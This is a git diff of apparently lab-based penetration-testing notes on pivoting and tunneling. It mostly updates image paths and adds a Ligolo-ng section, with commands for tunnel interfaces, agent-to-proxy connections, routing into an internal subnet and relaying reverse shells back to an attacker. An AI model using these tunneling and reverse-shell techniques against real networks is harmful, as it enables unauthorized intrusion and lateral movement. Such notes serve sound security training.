@@ -1,6 +1,6 @@
 # PIVOTING, TUNNELING, AND PORT FORWARDING
 
-![PivotingandTunnelingVisualized 1.gif](PivotingandTunnelingVisualized%201.gif)
+![PivotingandTunnelingVisualized.gif](.gitbook/assets/PivotingandTunnelingVisualized.gif)
 
 # Introduction
 
@@ -209,7 +209,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 
 ## **Remote/Reverse Port Forwarding with SSH**
 
-![Untitled](Untitled%206.png)
+![Untitled](.gitbook/assets/Untitled%201.png)
 
 - First we will create rev shell using metasploit, we will set the LHOST to that of pivot machine i.e `Ubuntu`.
 - Then we will use port `8080` on ubuntu server to forward all of our reverse packets to our attacker host’s `8000` port
@@ -481,7 +481,7 @@ msf6 exploit(multi/handler) > run
 
 ## **Socat Redirection with a Bind Shell**
 
-![Untitled](Untitled%201%202.png)
+![Untitled](.gitbook/assets/Untitled%201%201.png)
 
 In the case of bind shells, the Windows server will start a listener and bind to a particular port. 
 
@@ -524,7 +524,7 @@ Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS
 
 ## **Getting To Know Plink**
 
-![Untitled](Untitled%202%201.png)
+![Untitled](.gitbook/assets/Untitled%202.png)
 
 For this, Windows is used as attack host.
 
@@ -552,7 +552,7 @@ after configuring SOCKS server for `127.0.0.1` and port `9050` we can directly s
 
 [Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling.
 
-![Untitled](Untitled%203%201.png)
+![Untitled](.gitbook/assets/Untitled%203.png)
 
 - `sudo git clone https://github.com/klsecservices/rpivot.git`
 - `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`
@@ -573,7 +573,7 @@ We will configure proxychains to pivot over our local server on 127.0.0.1:9050 o
 
 [Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. 
 
-![Untitled](Untitled%204%201.png)
+![Untitled](.gitbook/assets/Untitled%204.png)
 
 We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.
 
@@ -597,7 +597,7 @@ Address         Port        Address         Port
 
 After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.
 
-![Untitled](Untitled%205%201.png)
+![Untitled](.gitbook/assets/Untitled%205.png)
 
 in xfreerdp we are specifying pivot machine ip and port at which pivot machine is listening.
 
@@ -851,7 +851,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
 
 # **Network Traffic Analysis Considerations**
 
-![analyzingTheTraffic 1.gif](analyzingTheTraffic%201.gif)
+![analyzingTheTraffic.gif](.gitbook/assets/analyzingTheTraffic.gif)
 
 In the first part of this clip, a connection is established over SSH without using ICMP tunneling. We may notice that `TCP` & `SSHv2` traffic is captured.
 
@@ -888,3 +888,67 @@ Now we can connect to 172.16.5.19 over RDP using `mstsc.exe`, and we should rec
 We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.
 
 # `/// [https://academy.hackthebox.com/module/158/section/1439](https://academy.hackthebox.com/module/158/section/1439)`
+
+# Ligolo
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+From Release section we need agent and proxy.
+
+`agent` folder in the pivot machine
+
+`proxy` on the attacker.
+
+In attacker, create a tunnel interface
+
+- `sudo ip tuntap add user [your_username] mode tun ligolo`
+- `sudo ip link set ligolo up`
+
+On attacker machine, lets run proxy
+
+- `./proxy -selfcert`
+
+In pivot machine, lets run agent.exe
+
+- `./agent.exe -connect  kali_linux_ip:11601 -ignore-cert`
+    
+    port `11601` is by default set on proxy in the attacker machine
+    
+    we should use `-autocert` flag when the pivot machine has internet access. This is more secure than `-ignore-cert` 
+    
+
+we now have our connection setup, but tunnel is not started yet
+
+In attacker machine
+
+- `sessions` to list session and select the session we want to connect
+- `ifconfig / ipconfig` to view the interface of pivot machine. Once we know the interface, ip subnet we want, We can add the networking route on our attacking machine
+
+on new terminal
+
+- `sudo ip route add 10.1.2.0/24 dev ligolo`
+    
+    here `10.1.2.0/24` is the subnet we want access
+    
+    once our route is setup, go back to proxy
+    
+- `start` → will start tunnel to the pivot machine
+
+And we are all set.
+
+## Some Important Points
+
+Lets say we now have access to the windows machine on `10.1.2.0/24` which was previously not routable from our attacker host.
+Now we want reverse shell connection from that machine.
+
+That windows machine cannot reach us, it does not have route to our ip, it can only reach the pivot machine.
+
+To solve this, we can do.
+
+We can listen to ports on Agent (pivot machine) and redirect the connection back to us (attacker machine)
+
+we can set this up using 
+
+- In attacker proxy terminal `listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp`
+    
+    on the pivot machine, any device or interface on port `3000` will redirect our port `10000`
